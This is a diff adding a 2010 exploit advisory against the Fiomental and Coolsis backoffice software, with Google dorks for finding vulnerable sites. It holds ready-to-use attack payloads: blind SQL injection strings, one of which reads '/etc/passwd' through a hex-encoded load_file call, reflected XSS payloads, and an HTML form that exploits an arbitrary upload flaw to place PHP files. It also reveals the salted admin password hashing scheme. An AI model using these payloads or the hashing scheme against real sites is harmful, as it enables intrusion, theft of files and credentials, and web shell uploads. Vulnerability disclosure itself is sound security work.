@@ -1,0 +1,88 @@
+
+      ______                _       _   _             
+      | ___ \              | |     | | (_)            
+      | |_/ /_____   _____ | |_   _| |_ _  ___  _ __  
+      |    // _ \ \ / / _ \| | | | | __| |/ _ \| '_ \   
+      | |\ \  __/\ V / (_) | | |_| | |_| | (_) | | | |   
+      \_| \_\___| \_/ \___/|_|\__,_|\__|_|\___/|_| |_| 
+
+        _____                      _____  _____ 
+       |_   _|                    |  _  ||  _  |
+         | | ___  __ _ _ __ ___   | |/' || |_| |
+         | |/ _ \/ _` | '_ ` _ \  |  /| |\____ |
+         | |  __/ (_| | | | | | | \ |_/ /.___/ /
+         \_/\___|\__,_|_| |_| |_|  \___/ \____/
+         
+                           DEFACEMENT it's for script kiddies...
+_____________________________________________________________
+   
+[$] Exploit Title     : Fiomental & Coolsis Backoffice Multi Vulnerability
+[$] Date              : 10-05-2010            
+[$] Author            : MasterGipy
+[$] Email             : mastergipy [at] gmail.com
+[$] Bug               : Multi Vulnerability
+[$] Site              : http://www.fiomental.com/
+[$] Google Dork       : "Desenvolvido por: Fio Mental" or
+                        "Desenvolvido por: coolsis"
+
+
+[%] vulnerable file: index.php
+
+
+[BLIND SQL INJECTION]
+
+[$] Exploit:
+
+[+] http://example.pt/?cod=1  <- SQL
+[+] sql_1: -1' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 and '1'='1
+[+] sql_2: -1' UNION ALL SELECT 1,2,3,load_file(0x2F6574632F706173737764),5,6,7,8,9,10 and '1'='1
+
+
+
+[XSS]
+
+[+] http://[site]/index.php/>"><script>alert(/LOL/)</script>
+
+
+[%] vulnerable file: /admin/index2.php
+
+
+[REMOTE ARBITRARY UPLOAD VULNERABILITY]
+
+[$] Exploit:
+
+<html>
+<form action="http://<-- CHANGE HERE -->/admin/index2.php?sc=up1&ac=a1" method="post" enctype="multipart/form-data" name="form1">
+<p align="center">
+<input name="ficheiro" type="file" class="file" id="ficheiro"> 
+<input name="ok" type="submit" class="button" id="ok" value="OK">
+</p>
+<p align="center">(only gif png jpg are allowed) </p>
+<p align="center">Files go to:  http://example.pt/uploads/your_file.php.png</p>
+</form>
+</html>
+
+
+[XSS]
+
+[$] http://[site]/admin/index2.php?&cod=1&ac=a1&tituloSc=<script>alert(/LOL/)</script>
+(you need to login for this one)
+
+
+
+[%] EXTRA:
+
+[$] Admin Panel Password Algorithm 
+
+<?php
+$login = "test";
+$pass = "test";
+
+$total = md5(($login . 'fiomental').(md5($pass)));
+// md5($salt.md5($pass)
+echo "$total"; // This will Print the password Hash.
+?>
+
+
+
+[§] Greetings from PORTUGAL ^^
